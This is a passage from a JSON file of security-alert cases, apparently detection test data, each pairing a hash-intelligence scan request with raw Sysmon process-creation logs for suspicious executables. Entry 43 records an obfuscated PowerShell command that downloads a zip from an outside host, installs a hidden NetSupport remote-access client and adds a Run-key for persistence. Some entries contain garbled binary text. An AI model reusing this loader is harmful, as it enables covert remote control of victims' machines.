            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\2210231586.exe\\\" \",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=DA1E9AA523AA8EE2CBBED75292F9C7C8,SHA256=E16A60A10EBACD0B8AF5320E9582ABD6B1EC86B459BD35FD4E69BD37807F4A47,IMPHASH=18690DF0ED1BE01972DCB3DC78C42692\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\2210231586.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-2F94-647F-C9CC-030000000000}\",\"LogonId\":\"0x3ccc9\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /c start /I \\\"\\\" \\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\2210231586.exe\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\SysWOW64\\\\cmd.exe\",\"ParentProcessGuid\":\"{C784477D-A42A-6517-2606-000000004400}\",\"ParentProcessId\":\"3380\",\"ProcessGuid\":\"{C784477D-A42A-6517-2806-000000004400}\",\"ProcessID\":2296,\"ProcessId\":\"3080\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366193,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":364,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-13 05:32:26.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\SysWOW64\\cmd.exe"
        ]
    },
    "41": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityWMIhosts.exe launched by svchost.exe",
        "ini_data": [
            "<14>Dec 26 05:56:02 sftp.cachemoney.local Microsoft-Windows-Sysmon[3196]: {\"EventTime\":1735106162,\"Hostname\":\"sftp.cachemoney.local\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":212667,\"ProcessID\":3196,\"ThreadID\":4204,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-20\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 2024-12-25 05:56:02.069\\r\\nProcessGuid: {f31bccf6-d0ef-642a-9517-000000001500}\\r\\nProcessId: 6224\\r\\nImage: C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\\r\\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\\r\\nDescription: WMI Hosts\\r\\nProduct: WMIHosts.exe\\r\\nCompany: Microsoft WMI Hosts\\r\\nOriginalFileName: WMIHosts.exe\\r\\nCommandLine: \\\"C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\\\"\\r\\nCurrentDirectory: C:\\\\ProgramData\\\\WMI hosts\\\\\\r\\nUser: CACHEMONEY\\\\adminsftp\\r\\nLogonGuid: {f31bccf6-d0ef-642a-9a81-b51000000000}\\r\\nLogonId: 0x10B5819A\\r\\nTerminalSessionId: 0\\r\\nIntegrityLevel: High\\r\\nHashes: MD5=93D6932BAF35FCE2591D5FE10D3C272B,SHA256=98DA115742244728861B78C9091590039A93FAF0E3DA02DA655664E66684DE33,IMPHASH=3ABE302B6D9A1256E6A915429AF4FFD2\\r\\nParentProcessGuid: {f31bccf6-92c6-6412-2700-000000001500}\\r\\nParentProcessId: 1692\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\svchost.exe\\r\\nParentCommandLine: C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\\r\\nParentUser: NT AUTHORITY\\\\SYSTEM\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"-\",\"UtcTime\":\"2024-12-25 05:56:02.069\",\"ProcessGuid\":\"{f31bccf6-d0ef-642a-9517-000000001500}\",\"Image\":\"C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\",\"FileVersion\":\"10.0.17763.1697 (WinBuild.160101.0800)\",\"Description\":\"WMI Hosts\",\"Product\":\"WMIHosts.exe\",\"Company\":\"Microsoft WMI Hosts\",\"OriginalFileName\":\"WMIHosts.exe\",\"CommandLine\":\"\\\"C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\\\"\",\"CurrentDirectory\":\"C:\\\\ProgramData\\\\WMI hosts\\\\\",\"User\":\"CACHEMONEY\\\\adminsftp\",\"LogonGuid\":\"{f31bccf6-d0ef-642a-9a81-b51000000000}\",\"LogonId\":\"0x10b5819a\",\"TerminalSessionId\":\"0\",\"IntegrityLevel\":\"High\",\"Hashes\":\"MD5=93D6932BAF35FCE2591D5FE10D3C272B,SHA256=98DA115742244728861B78C9091590039A93FAF0E3DA02DA655664E66684DE33,IMPHASH=3ABE302B6D9A1256E6A915429AF4FFD2\",\"ParentProcessGuid\":\"{f31bccf6-92c6-6412-2700-000000001500}\",\"ParentProcessId\":\"1692\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\",\"ParentUser\":\"NT AUTHORITY\\\\SYSTEM\",\"EventReceivedTime\":1735106162,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\svchost.exe"
        ]
    },
    "42": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityWindPlugin.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindPlugin.exe\\\" \",\"Company\":\"Softdiv Software Sdn Bhd\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\",\"Description\":\"Softdiv MP3 to WAV Converter.exe\",\"EventID\":1,\"FileVersion\":\"0.3.2.0\",\"Hashes\":\"MD5=4265F75CBB4BA1BC23B07890ED42872B,SHA256=5A29583A80B7DC2CBCE4B8712024DCDFF9F777D908B6F16DFB3D59FAD991083E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindPlugin.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-AA65-6384-F2E8-030000000000}\",\"LogonId\":\"0x3e8f2\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"fbab6880a695.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-AA65-6384-6B00-000000004300}\",\"ParentProcessId\":\"4920\",\"ProcessGuid\":\"{C784477D-2B5F-638F-0806-000000004300}\",\"ProcessID\":2288,\"ProcessId\":\"468\",\"Product\":\"Softdiv MP3 to WAV Converter 3.2\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":92342,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":688,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-10-02 04:33:07.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "43": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by powershell.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -ExecutionPolicy Bypass -Command \\\"cd $env:AppData; $Z1P0r='R0k3r.zip'; $eXp4r0cH=Get-Command expand-archive -ErrorAction SilentlyContinue; $p4NteCh=$env:APPDATA+'\\\\'+$Z1P0r; $lI0n3k='https://a.ezydict.com/4th_2.zip'; $r1N4m='OfficeStartup'; $b1tS1iT=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue; $b1tSiRcDm = 'bitsadmin.exe /transfer MeDoW /download /priority normal '+$lI0n3k+' '+$p4NteCh; $peS1zP=$env:APPDATA+'\\\\'+$r1N4m; if ($eXp4r0cH) {if ($b1tS1iT) {Start-BitsTransfer -Source $lI0n3k -Destination $p4NteCh;} else {Invoke-Expression -Command $b1tSiRcDm}; expand-archive -path $p4NteCh -destinationpath $peS1zP; Remove-Item -path $p4NteCh;} else {$f1L1es=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', 'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL'); $lI0n3k2='http://YOUR.LINK/files/'; New-Item -Path $env:APPDATA -Name $r1N4m -ItemType 'directory'; if ($b1tS1iT) {$f1L1es | ForEach-Object {$s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; Start-BitsTransfer -Source $s10r13s -Destination $1dus1T; }; } else { $f1L1es | ForEach-Object { $s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; $b1tSiRcDm2='bitsadmin.exe /transfer MeDoW /download /priority normal '+$s10r13s+' '+$1dus1T; Invoke-Expression -Command $b1tSiRcDm2; }; }; }; $F1l1ed3=Get-Item $peS1zP -Force; $F1l1ed3.attributes='Hidden'; cd $peS1zP; start client32.exe; $F33Sr=$peS1zP+'\\\\client32.exe'; New-ItemProperty -Path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name $r1N4m -Value $F33Sr  -PropertyType 'String'; #g7Vc*-Jh7tZPfY0q6P5D5o15GdlrN#Y7-mQOJpX*i$pocw(-ErQELxY\\u0026de$r0xwndS-WV3PLGJ%5zWmLeyAPpYrP*#qgHDM=7UOXjaCfWx=8nWHx_sEFQE%tw1R)g7A\\u0026)mBA6nJeZiFOS=Zh#DbY^=WJyZDO2!XWKJGFqFa-$s*agin!r0kd#f!^RPu@mnF5NaBx6$fE$T\\u0026d6kyj3\\u0026vFok--dte8=1hK!QM-M$8m1C@n%OO%lq$1iaeWW5SX1aBcfkAi\\u0026UwPe_xOHnJiEct^1VBmC2EJy3uw_Zi5(eis^88NYX\\u00267n\\u0026mf%#iy0fVL\\u0026T_eRg-S8pE(0qg=MaIDD(Spzk37l7hMRe\\u0026Q@0twVYvUbE=hnofn@AA*Y(Sz$oK!J382C00v^yZSnMlyL6CVD!=T-s)*uFi%OxVSNzxSj_=%lOWdZm\\u0026HNCi$C+Ar9Ype=-RxmJsdwSEMjJ7@sT@A^vi4+jebdE\\u0026W_Uxbgc\\u0026j2G1KjeA!=\\u0026yH$B_bHLM+Bpn4hY6$pnFWXPCr4JrlKYo(Pra)eeS_L3d=sopqXgG^H+#j*l!zvex+%J#T8cZM\\u0026Y((gzD7HiCQJ(-9bRCrh6nV+c7eiQiQ_h6ywU0P3AUtnzlGdq6C$*GS$^(=7\\u0026$KnWWpsczhj@VG6(+frmeyyBNnQawJE-q(V3tEo=gkOq2b5hXIu9+AjgmHra@j07QroSPC2YC55!IQi@Y=t-eUJav@Wrd8M%oUXixYa0ftlsa@c6iWW(Q_vCl_)lDr\\u0026CzRHa^\\u0026qTFyM5CiXjkxQ6Pn6zNT_Cd6Cqv7F^ACC7qKAw7JPm^6K_Zp+wPr(V(l0k@qhe0HTdjB+lJYN*@ICyrrUAmA8DVa\\u0026c9xcq_+-T#zfYDP!d6!TOF%\\u0026R1eX%oMdi3a3_32Yq*njTDjsVs*PwD)L#e4)bV@dxM\\u0026%1BwbsZvdlYka=j+fe9*niSr1C(1(E!K!9!HBGfvAG%US=ipYlC\\u0026eA(4)lN3t^I3hMWVWPxMWlJSiCI3n5yTPYp$ni5pQMGH@-#\\u0026#^_k(d6UCVqtqpC!4^#TfS@8s\\u0026QA^cEZe!jXJR4_6uq3Y-lHr0D_hkxn9LMN$RY#ugP^B2kzoQU(cdqJ5Y+igS1fQ0h=87xG_j$XS)6J3r*((T6+!Fuq+L@@(81_dZyXPn3E9oEiZca9A0x7=@q1qyeN93JFFXP4lJk^8n1iABAm\\u0026PdofW\\u0026hXHfFC!kxz(PvTTNIuk6G^l6=OqnhXW_1hD_GYo\\u0026=RH\\u0026TpLTSj^VoPBPfSYFKxoPXNN@R31wLxUsMeyVieYz*rRUBFQTkp3Me8eC516O5^jvvdn3\\u0026D$$z17mWM=+1C+FjF\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentProcessGuid\":\"{C784477D-B0D6-648B-B80A-000000004A00}\",\"ParentProcessId\":\"6632\",\"ProcessGuid\":\"{C784477D-B0F2-648B-BA0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"2352\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749896,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-20 05:34:02.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ]
    },
    "44": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitysoftware.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\\\" --AutoStart\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=65D2046ADD5EF298FBA308EDB9C291DC,SHA256=60C85D1E4B4698E35E83519E16025AA11B6F79A69F02E483A8BAF5E97CD04752,IMPHASH=C7006B0F6ACDFB37FFEEBFD2C1715395\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-A525-648A-09F3-030000000000}\",\"LogonId\":\"0x3f309\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-A525-648A-6A00-000000004400}\",\"ParentProcessId\":\"4876\",\"ProcessGuid\":\"{C784477D-840C-6517-3806-000000004400}\",\"ProcessID\":2300,\"ProcessId\":\"5252\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366213,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":680,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-01 05:33:30.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "45": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitymyfile.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=2B248E9302A441C389C30A85534C0CC2,SHA256=05D6B2F8A9C4C319CA23E571B9BD77142F3C880524A67B6F6783550AF620374B,IMPHASH=9F9C7E0B30ED8F52F90B658711975D4C\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"myfile.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4965\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2305,\"ProcessId\":\"10145\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":705,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-09 05:32:26.115\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "46": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityqClNkVtHKskoh.exe",
        "ini_data": [
            "□$□□□□□□□□□□□□□ □N2□Chronicle Internal□&□\"deborah-thao-windows-pc.corp.local\"□*f\"d□□54766□Q□ 27444605dff20d1e704b5cf682d035d2*-C:\\Users\\AppData\\Local\\Temp\\qClNkVtHKskoh.exe*□ID:54766"
        ]
    },
    "47": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityqClNkVtHKskoh.exe",
        "ini_data": [
            "□%□□□□□□□□□□□□□□ □N2□Chronicle Internal□,□(christine-chadwick-windows-pc.corp.local\"□*d\"b□□9736□Q□ 27444605dff20d1e704b5cf682d035d2*-C:\\Users\\AppData\\Local\\Temp\\qClNkVtHKskoh.exe*□ID:9736"
        ]
    },
    "48": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitymyfile.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=2B248E9302A441C389C30A85534C0CC2,SHA256=05D6B2F8A9C4C319CA23E571B9BD77142F3C880524A67B6F6783550AF620374B,IMPHASH=9F9C7E0B30ED8F52F90B658711975D4C\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"myfile.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4965\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2305,\"ProcessId\":\"10145\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":705,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-05 05:32:11.115\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "49": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityAvl.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\Avl.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=4064209A8AB2F313551CBB57AC1FCD94,SHA256=0000A30F08A3BC2D09C7A03A12A03C85BC6F01F264652170C49826DD944DC018,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\Avl.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"Avl.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4967\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2307,\"ProcessId\":\"10147\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379907,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":707,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-10-03 04:33:30.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "50": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityprogram.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\program.exe\\\"\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=DC9B8E9B20BB6D18F902A7460BF0F92C,SHA256=0D6518769E10895CC1880040FB0680520CB179D37624BD2685368414B4A6E4EB,IMPHASH=96BAACC90461FCD4B5D9FCC50047C098\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\program.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-CFB4-648A-FCF7-030000000000}\",\"LogonId\":\"0x3f7fc\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-CFB4-648A-6900-000000004400}\",\"ParentProcessId\":\"4892\",\"ProcessGuid\":\"{C784477D-B8D5-6517-2F06-000000004400}\",\"ProcessID\":2320,\"ProcessId\":\"8160\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366184,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":1924,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2025-01-02 05:32:23.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "51": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-081A-6482-8000-000000004A00}\",\"ParentProcessId\":\"4668\",\"ProcessGuid\":\"{C784477D-B0FA-648B-BC0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"6156\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-19 05:35:21.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "52": {
